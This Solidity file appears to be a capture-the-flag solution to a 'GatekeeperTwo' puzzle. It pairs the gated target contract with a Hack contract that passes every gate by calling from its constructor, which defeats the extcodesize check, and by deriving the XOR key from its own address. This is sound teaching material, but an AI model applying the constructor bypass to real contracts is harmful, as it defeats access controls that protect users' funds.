// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
  // Gate One passed because we are calling the contract from another contract, not from EOA

  // pass the gate two by calling the contract from CONSTRUCTOR
  constructor(address _target) {
  // calculate the _gateKey by ^ the uin64 max with uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
    GatekeeperTwo target = GatekeeperTwo(_target);
    require(target.enter(key));
  }
  

}

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}